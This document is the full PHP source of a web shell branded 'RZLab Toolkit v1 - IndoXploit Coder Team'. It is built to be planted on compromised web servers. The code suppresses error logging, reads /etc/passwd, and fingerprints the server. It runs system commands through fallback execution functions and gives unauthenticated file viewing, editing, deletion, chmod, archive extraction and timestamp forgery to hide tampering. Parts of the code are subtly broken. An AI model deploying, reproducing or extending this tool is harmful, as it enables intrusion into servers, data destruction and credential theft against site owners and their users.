<?php
session_start();
error_reporting(0);
set_time_limit(0);
@set_magic_quotes_runtime(0);
@clearstatcache();
@ini_set('error_log',NULL);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@ini_set('output_buffering',0);
@ini_set('display_errors', 0);
@ini_set('output_buffering',0); 
$etc = file_get_contents("/etc/passwd");
$etcz = explode("\n",$etc);
if(is_readable("/etc/passwd")){
$list = scandir("/var/named");
foreach($etcz as $etz){
$etcc = explode(":",$etz);
foreach($list as $domain){
if(strpos($domain,".db")){
$domain = str_replace('.db','$domain');
$owner = posix_getpwuid(fileowner("/etc/valiases/".$domain));
if($owner['name'] == $etcc[0])
{
$readdomain += 1;
}}}}
    $load = file_get_contents("/proc/loadavg");
    $load = explode(' ',$load);
    $load = $load[0];
    if (!$load && function_exists('exec')) {
        $reguptime=trim(exec("uptime"));
        if ($reguptime) if (preg_match("/, *(\d) (users?), .*: (.*), (.*), (.*)/",$reguptime,$uptime)) $load = $uptime[3];
    }

    $uptime_text = file_get_contents("/proc/uptime");
    $uptime = substr($uptime_text,0,strpos($uptime_text," "));
    if (!$uptime && function_exists('shell_exec')) $uptime = shell_exec("cut -d. -f1 /proc/uptime");
    $days = floor($uptime/60/60/24);
    $hours = str_pad($uptime/60/60%24,2,"0",STR_PAD_LEFT);
    $mins = str_pad($uptime/60%60,2,"0",STR_PAD_LEFT);
    $secs = str_pad($uptime%60,2,"0",STR_PAD_LEFT);

    $phpver = phpversion();
    $mysqlver = (function_exists("mysql_get_client_info")) ? mysql_get_client_info() : '-';
    $zendver = (function_exists("zend_version")) ? zend_version() : '-';
    
$mysql = (function_exists('mysql_connect')) ? "<span class='label label-success'>ON</span>" : "<span class='label label-danger'>OFF</span>";
$mssql = (function_exists('mssql_connect')) ? "<span class='label label-success'>ON</span>" : "<span class='label label-danger'>OFF</span>";
$oracle = (function_exists('ocilogon')) ? "<span class='label label-success'>ON</span>" : "<span class='label label-danger'>OFF</span>";
$curl = (function_exists('curl_version')) ? "<span class='label label-success'>ON</span>" : "<span class='label label-danger'>OFF</span>";
$wget = (exec('wget --help')) ? "<span class='label label-success'>ON</span>" : "<span class='label label-danger'>OFF</span>";
  function showdisablefunctions() {
    if ($disablefunc=@ini_get("disable_functions")){ return "<style>
        input { margin:0;background-color:#000;border:1px solid #DF0000;color:#DF0000; }
    </style><input type='text' value='".$disablefunc."' size='80'>"; }
    else { return "<span class='label label-success'>NONE</span>"; }
  }
  if (@ini_get("safe_mode") or strtolower(@ini_get("safe_mode")) == "on") {
    $safemode = TRUE;
    $hsafemode = "<span class='label label-danger'>ON</span>";
  }
  else {
    $safemode = FALSE;
    $hsafemode = "<span class='label label-success'>OFF</span>";
  }
  $v = @ini_get("open_basedir");
  if ($v or strtolower($v) == "on") {
    $openbasedir = TRUE;
    $hopenbasedir = "<span class='label label-danger'>".$v."</span>";
  }
  else {
    $openbasedir = FALSE;
    $hopenbasedir = "<span class='label label-success'>OFF</span>";
  }      
/* shell function */
/* size Disk on Server */
function hdd($s) {
if($s >= 1073741824)
return sprintf('%1.2f',$s / 1073741824 ).' GB';
elseif($s >= 1048576)
return sprintf('%1.2f',$s / 1048576 ) .' MB';
elseif($s >= 1024)
return sprintf('%1.2f',$s / 1024 ) .' KB';
else
return $s .' B';
}
/* Execute Function and Method on Server */function exe($cmd) { 	
if(function_exists('system')) { 		
		@ob_start(); 		
		@system($cmd); 		
		$buff = @ob_get_contents(); 		
		@ob_end_clean(); 		
		return $buff; 	
	} elseif(function_exists('exec')) { 		
		@exec($cmd,$results); 		
		$buff = ""; 		
		foreach($results as $result) { 			
			$buff .= $result; 		
		} return $buff; 	
	} elseif(function_exists('passthru')) { 		
		@ob_start(); 		
		@passthru($cmd); 		
		$buff = @ob_get_contents(); 		
		@ob_end_clean(); 		
		return $buff; 	
	} elseif(function_exists('shell_exec')) { 		
		$buff = @shell_exec($cmd); 		
		return $buff; 	
	} 
}
/* File Readable */
function fr($file) {
if(!is_readable($file)) {
		return "<font color=red>R</font>";
	} else {
		return "<font color=lime>R</font>";
	} 
}
/* File Writable */
function fw($file) {
if(!is_writable($file)) {
		return "<font color=red>W/</font>";
	} else {
		return "<font color=lime>W/</font>";
	}
}
function perms($file){
$perms = fileperms($file);
if (($perms & 0xC000) == 0xC000) {
// Socket
$info = 's';
} elseif (($perms & 0xA000) == 0xA000) {
// Symbolic Link
$info = 'l';
} elseif (($perms & 0x8000) == 0x8000) {
// Regular
$info = '-';
} elseif (($perms & 0x6000) == 0x6000) {
// Block special
$info = 'b';
} elseif (($perms & 0x4000) == 0x4000) {
// Directory
$info = 'd';
} elseif (($perms & 0x2000) == 0x2000) {
// Character special
$info = 'c';
} elseif (($perms & 0x1000) == 0x1000) {
// FIFO pipe
$info = 'p';
} else {
// Unknown
$info = 'u';
}
// Owner
$info .= (($perms & 0x0100) ? 'r' : '-');
$info .= (($perms & 0x0080) ? 'w' : '-');
$info .= (($perms & 0x0040) ?
(($perms & 0x0800) ? 's' : 'x' ) :
(($perms & 0x0800) ? 'S' : '-'));
// Group
$info .= (($perms & 0x0020) ? 'r' : '-');
$info .= (($perms & 0x0010) ? 'w' : '-');
$info .= (($perms & 0x0008) ?
(($perms & 0x0400) ? 's' : 'x' ) :
(($perms & 0x0400) ? 'S' : '-'));
// World
$info .= (($perms & 0x0004) ? 'r' : '-');
$info .= (($perms & 0x0002) ? 'w' : '-');
$info .= (($perms & 0x0001) ?
(($perms & 0x0200) ? 't' : 'x' ) :
(($perms & 0x0200) ? 'T' : '-'));
return $info;
}
/* shell check dir and file method */
$dir = getcwd();
$dir = (isset($_GET['act'])) ? $_GET['dir'] : getcwd();
if (isset($_GET['dir'])) {
		$dir = $_GET['dir'];
		$size = strlen($dir);
		while ($dir[$size - 1] == '/') {
			$dir = substr($dir, 0, $size - 1);
			$size = strlen($dir);
		}
	} else {
		$dir = $_SERVER["SCRIPT_FILENAME"];
		$size = strlen($dir);
		while ($dir[$size - 1] != '/') {
			$dir = substr($dir, 0, $size - 1);
			$size = strlen($dir);
		}
		$dir = substr($dir, 0, $size - 1);
}
 $scandir = scandir($dir);        
?>
<html>
<head>
<title> RZLab Toolkit v1 </title>
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.5/css/bootstrap.min.css" integrity="sha384-AysaV+vQoT3kOAXZkl02PThvDr8HYKPZhNT5h/CXfBThSRXQ6jW5DO2ekP5ViFdi" crossorigin="anonymous">
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
<link href="http://bootswatch.com/yeti/bootstrap.min.css" rel="stylesheet" type="text/css" />
<style type='text/css'>
@import url(https://fonts.googleapis.com/css?family=Ubuntu);
body {
    background: #000000;
    color: #00ff00;
    font-family: 'Ubuntu';
	font-size: 13px;
	width: 100%;
}
li {
	display: inline;
	margin: 5px;
	padding: 5px;
}
table, th, td {
	border-collapse:collapse;
	font-family: Tahoma, Geneva, sans-serif;
	background: transparent;
	font-family: 'Ubuntu';
	font-size: 13px;
}
.table_home, .th_home, .td_home {
	border: 1px solid #df0000;
}
th {
	padding: 10px;
}
td {
	padding: 4px;
  margin:4;
}
a {
	color: #00ff00;
	text-decoration: none;
}
a:hover {
	color: gold;
	text-decoration: underline;
}
b {
	color: gold;
}
input[type=text], input[type=password],input[type=submit] {
	background: transparent; 
	color: #00ff00; 
	border: 1px solid #df0000; 
	margin: 5px auto;
	padding-left: 5px;
	font-family: 'Ubuntu';
	font-size: 13px;
}
textarea {
	border: 1px solid #df0000;
	width: 100%;
	height: 400px;
	padding-left: 5px;
	margin: 10px auto;
	resize: none;
	background: transparent;
	color: #00ff00;
	font-family: 'Ubuntu';
	font-size: 13px;
}
select {
	width: 152px;
	background: #000000; 
	color: lime; 
	border: 1px solid #df0000; 
	margin: 5px auto;
	padding-left: 5px;
	font-family: 'Ubuntu';
	font-size: 13px;
}
option:hover {
	background: lime;
	color: #000000;
}
table, th, td {
	border-collapse:collapse;
	border:1px solid #008000;
	font-family:Tahoma, Geneva, sans-serif;
	font-size:12px;
}
 
.rzlab_head {
	background-color:#000000;
}
 
.rzlab_head th {
	padding:10px;
	color:#008000;
	font-size:12px;
}
.rzlab_body1 {
	background-color:#000000;
}
 
.rzlab_body2 {
	background-color:#000000;
}
</style>
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.5/js/bootstrap.min.js" integrity="sha384-BLiI7JTZm+JWlgKa0M0kGRpJbF2J8q+qreVrKBC47e3K6BW78kGLrCkeRX6I9RoK" crossorigin="anonymous"></script>
<script src="http://code.jquery.com/jquery-1.11.1.min.js"></script>
</head>
<body>
<div class="container">
      <div class="row">
        <div class="col-md-12">
          <h1 align="center">RZLab Toolkit v1 - IndoXploit Coder Team</h1>
        </div>
      </div>
      <div class="row clearfix">
          <div class="col-md-12 column">
              <div class="panel panel-info">
                <div class="panel-heading">
                  <h3 class="panel-title">
                    Server Info
                    <small class="pull-right">Server load: <?php echo $load; ?> ~ uptime: <?php echo "$days Days $hours:$mins:$secs"; ?> </small>
                  </h3>
                </div>                
              </div>
            <div style='padding:4px; border:1px solid red; color:green;'>
            <i class="fa fa-globe"></i>
            Server Hostname:
            <a href="http://<?php echo php_uname('n');?>" target="_blank" data-toggle="tooltip" data-placement="bottom" title="Go To Server">
            <span class="label label-success"><?php echo php_uname('n');?></span>
            </a>
            <i class="fa fa-desktop"></i>
            Server OS: 
            <span class="label label-success"><?php echo php_uname("s");?></span> <br />
            <i class="fa fa-cloud"></i>
             Server Kernel Version:  
            <span class="label label-success"><?php echo php_uname("r"); ?></span>
            <i class="fa fa-cloud"></i>
                Release:  
            <span class="label label-success"><?php echo php_uname("v"); ?></span>
            <i class="fa fa-cloud"></i>
                Machine type:  
            <span class="label label-success"><?php echo php_uname("m"); ?></span> <br />
            <i class="fa fa-gear"></i>
            Safe Mode:  
           <?php echo $hsafemode; ?>
            <i class="fa fa-folder-open-o"></i>
            Open Base DIR:
            <?php echo $hopenbasedir;?>
           <i class="fa fa-info"></i>
            Disable Functions: 
            <?php echo showdisablefunctions();?><br />
            <i class="fa fa-database"></i>
            MYSQL:  
           <?php echo $mysql; ?>
           <i class="fa fa-database"></i>
            MSSQL:
            <?php echo $mssql;?>
           <i class="fa fa-database"></i>
            Oracle: 
            <?php echo $oracle;?>
            <i class="fa fa-bolt"></i>
            cUrl: 
            <?php echo $curl;?>
            <i class="fa fa-download"></i>
            Wget: 
            <?php echo $wget;?>
            <i class="fa fa-hdd-o"></i>
            HDD:
            <span class="label label-success"><?php echo hdd(disk_free_space('/'))." / ".hdd(disk_total_space('/')); ?></span><br />
            <i class="fa fa-location-arrow"></i>
             Location:
             <?php echo $dir;?>
            </div>
          </div> 
      </div>
          <?php
           echo "<div style='padding:3px; border:1px solid red; color:green;'><form method='GET'>Change Dir :  <input type='text' name='dir' size='100' height='10'value='$dir'>&nbsp;&nbsp;<input type='submit' name='act' value='go' style='width: 80px;'></form></div><br />";
echo "<center><div style='padding:4px; border:1px solid red; color:red;'>
<a href='$script2'><i class='glyphicon glyphicon-home' aria-hidden='true'></i></a> | <a href='$script2?xploit=about'> Indo Xploit</a> | <a href='$script2?xploit=upload'>Upload</a> | <a href='$script2?logout'>Logout</a> # 
</div></center><hr>";
          ?>
    <table width="100%" border="0" cellpadding="3" cellspacing="1" align="">
    <a href="#" class="btn btn-primary btn-xs pull-right" title="create new file"><b>+</b> <i class="fa fa-folder"></i></a>
    <a href="#" class="btn btn-primary btn-xs pull-right" title="create new folder"><b>+</b> <i class="fa fa-folder"></i></a>
        <tr class="rzlab_head">
            <th>Dir Name</th>
            <th>Type</th>
            <th>Last modified</th>
            <th>Permission</th>
            <th class="text-center">Action</th>
        </tr>
        <?php
        foreach($scandir as $dirx) { 
	if(!is_dir("$dir/$dirx") || $dir == '.' || $dir == '..') continue; 
  $ftime = date("F d Y g:i:s", filemtime("$dir/$file"));          
  $dw = is_writeable("$dir/$dirx") ? "<font color='lime'><b>W</b></font>" : "<font color='red'><b>W</b></font>";
  $dr = is_readable("$dir/$dirx") ? "<font color='lime'><b>R</b></font>" : "<font color='red'><b>R</b></font>";  
  $cktype = filetype("$dir/$dirx");
  if($cktype == "dir"){
   $dtype = "<i class='fa fa-folder'></i>";
  }            
  echo "<tr class='rzlab_body1'>";
	echo "<td><i class='fa fa-folder'></i> [ <a href='?act=view&dir=$dir/$dirx'>$dirx</a> ]</td>"; 
  echo "<td><center><font color=lime>$dtype</font></center></td>";
  echo "<td><center><font color=lime>$ftime</font></center></td>";
  //echo "<td><center>".$dw."/".$dr."</center></td>";
  echo "<td><center><font color='lime'>".perms($dir)."</font></center></td>"; 
        ?>  
   <td class="text-center"><a href="#" class="btn btn-danger btn-xs"><span class="fa fa-remove"></span> Remove Dir</a></td>     
        <?php
        }       
        ?>
  </tr>
    </table><hr>
    <?php
    echo '<table width="100%" border="0" cellpadding="3" cellspacing="1" align="">
<tr class="head">
<th><center>File Name </center></th>
<th><center>Type </center></th> 
<th><center>Size </center></th>
<th><center>Last modified</center></th>
<th><center>Permission</center></th>
<th><center>Actions</center></th> 
</tr>';
foreach($scandir as $file) {
	if(!is_file("$dir/$file")) continue;
  $ftime = date("F d Y g:i:s", filemtime("$dir/$file"));
	$size = filesize("$dir/$file")/1024;
	$size = round($size,3);
	if($size > 1024) {
		$size = round($size/1024,2). 'MB';
	} else {
		$size = $size. 'KB';
	}
	$cd = "$dir/$file";
  $cfile = filetype("$dir/$file");
  if($cfile == "file"){
  $ftype="<i class='fa fa-file'>";
  } 
  echo "<tr class='rzlab_body2'>";
  echo "<td><i class='fa fa-file'></i> [ <a href='?act=view&dir=$dir&file=$cd'>$file</a> ] </td>";
  echo "<td><center><font color=lime>$ftype</font></center></td>";
  echo "<td><center><font color=lime>$size</font></center></td>";
  echo "<td><center><font color=lime>$ftime</font></center></td>";
  echo "<td><center><font color='lime'>".perms($cd)."</font></center></td>";
  echo "<td><center><a href='?act=edit&dir=$dir&file=$cd' class='btn btn-primary btn-xs' title='Edit File'><i class='fa fa-edit'></i></a> |<a href='?act=ren&dir=$dir&file=$cd' class='btn btn-primary btn-xs' title='Rename File'> <i class='fa fa-gear'></i></a> |<a href='?act=del&dir=$dir&file=$cd' class='btn btn-danger btn-xs' title='Delete File'> <i class='fa fa-trash'></i></a> | <a href='?act=zip&dir=$dir&file=$cd' class='btn btn-primary btn-xs' title='Unzip Archive File'> <i class='fa fa-file-zip-o'></i></a> | <a href='?act=chmod&dir=$dir&file=$cd' class='btn btn-primary btn-xs' title='Change Permission File'> <i class='fa fa-shield'></i></a> | <a class='btn btn-primary btn-xs' href='?act=touch&dir=$dir&file=$cd' title='Modification time of file'> <i class='fa fa-refresh'></i></a></center></td>";        
if($_GET['act'] == 'view' && $_GET['file'] == $cd) {
	$h_isi = htmlspecialchars(@file_get_contents($cd));
	$hasil = "<textarea name='source'>$h_isi</textarea><br>";
	  }
if($_GET['act'] == 'edit' && $_GET['file'] == $cd) {
   if($_POST['do'] == 'save') {
			$edit = file_put_contents($cd, $_POST['source']);
			if($edit) {
				$act = "<center><div style='padding:4px; border:1px solid red; color:red;'>Saved!</div></center>";
			} else {
				$act = "<center><div style='padding:4px; border:1px solid red; color:red;'>Permission Denied</div></center>";
			} 
      }
	$h_isi = htmlspecialchars(@file_get_contents($cd));
	$hasil = "<form method='post' action=''><textarea name='source'>$h_isi</textarea><br><input type='submit' name='do' value='save' style='width: 150px;'></form>";
	} 
if($_GET['act'] == 'ren' && $_GET['file'] == $cd) {
   if($_POST['do'] == 'rename') {
			$ren = rename($cd, "$dir/".$_POST['fn']."");
			if($ren) {
				$act = "<center><div style='padding:4px; border:1px solid red; color:red;'>Renamed to <i>".$_POST['fn']."</i></div></center>";
			} else {
				$act = "<center><div style='padding:4px; border:1px solid red; color:red;'>Permission Denied</div></center>";
			}
		}
	$hasil = "<form method='post' action=''>Filename: <input type='text' name='fn' size='50' height='10' value='$file'>&nbsp;&nbsp;&nbsp;<input type='submit' name='do' value='rename' style='width: 150px;'></form>";
 }
if($_GET['act'] == 'del' && $_GET['file'] == $cd) {
   if($_POST['do'] == 'yes') {
			$unl = unlink($cd);
			if($unl) {
				$act = "<center><div style='padding:4px; border:1px solid red; color:red;'>File Deleted</div></center>";
			} else {
				$act = "<center><div style='padding:4px; border:1px solid red; color:red;'>Permission Denied</div></center>";
			} 
   }elseif($_POST['do'] == 'no') {
			$unl = ($cd);
			if($unl) {
				$act = "<center><div style='padding:4px; border:1px solid red; color:red;'>Deleted Cancel</div></center>";
			} else {
				$act = "<center><div style='padding:4px; border:1px solid red; color:red;'>Permission Denied</div></center>";
			} 
   }
	$hasil = "<center><div style='padding:4px; border:1px solid red; color:red;'><form method='post' action=''>! Warning !<br /> Becare when you deleted file <br /> Are you sure to delete file [ $file ]<br /> Choose : <input type='submit' name='do' value='yes' style='width: 150px;'><input type='submit' name='do' value='no' style='width: 150px;'></form></div></center>";
 } 
if($_GET['act'] == 'zip' && $_GET['file'] == $cd) {
   if($_POST['do'] == 'extract') {
   $xzip = $_POST['anwaru'];
   $zip = new ZipArchive ;
   if($zip ->open($dir.'/'.$xzip) === TRUE) {
   $zip ->extractTo($dir);
   $zip ->close ();
				$act = "<center><div style='padding:4px; border:1px solid red; color:red;'>Extract File Success</i></div></center>";
			} else {
				$act = "<center><div style='padding:4px; border:1px solid red; color:red;'>Extract File Failed!</div></center>";
			}
		}
	$hasil = "<form method='post' action=''>Extract File : <input type='text' name='anwaru' size='50' height='10' value='$file'>&nbsp;&nbsp;&nbsp;<input type='submit' name='do' value='extract' style='width: 150px;'></form>";
 } 
if($_GET['act'] == 'chmod' && $_GET['file'] == $cd) {
   if($_POST['do'] == 'chmod') {   
      $xfile = $_POST['file'];
      $xmode = $_POST['perm'];
      $mod = chmod("$xfile",$xmode);
			if($mod) {
				$act = "<center><div style='padding:4px; border:1px solid red; color:red;'>Change Permission Done</div></center>";
			} else {
				$act = "<center><div style='padding:4px; border:1px solid red; color:red;'>Change Permission Error!</div></center>";
			} 
		}
	$hasil = "<form method='post' action=''>Filename : <input type='text' name='file' size='8' height='10' value='$file'>&nbsp;&nbsp;&nbsp;Permission : <input type='text' name='perm' size='8' height='10' value='0755'>&nbsp;&nbsp;&nbsp;<input type='submit' name='do' value='chmod' style='width: 150px;'></form>
           <br /><center><div style='padding:4px; border:1px solid red; color:red;'>Info<br />0600 => Read and write for owner, nothing for everybody else<br />0644 => Read and write for owner, read for everybody else<br />0755 => Everything for owner, read and execute for everybody else<br />0740 => Everything for owner, read for owner's group</div></center>";
 }  
if($_GET['act'] == 'touch' && $_GET['file'] == $cd) {
   if($_POST['do'] == 'touch') {  
      $target = $_POST['file'];
      $menma = $_POST['date'];
      $new_date = strtotime("$menma");
			$aru = touch($target,$new_date);
			if($aru) {
				$act = "<center><div style='padding:4px; border:1px solid red; color:red;'>Change File Date Done</i></div></center>";
			} else {
				$act = "<center><div style='padding:4px; border:1px solid red; color:red;'>Change File Date Error!s</div></center>";
			}
		}
	$hasil = "<form method='post' action=''>Filename : <input type='text' name='file' size='8' height='10' value='$file'>&nbsp;&nbsp;&nbsp;Set New Time/Date : <input type='text' name='date' size='10' height='10' value='21 April 2016 06:00:00'>&nbsp;&nbsp;&nbsp;<input type='submit' name='do' value='touch' style='width: 150px;'></form>";
 }
} 
echo "</tr></table>";  
echo "$act$hasil<hr>"; 
    ?>
  </div>
  
<?php
echo "<center><i class='fa fa-search' aria-hidden='true'></i> Founded : ".$readdomain." Domains on Server ".php_uname("n")."</center><br />";}
?>
</body>
</html>
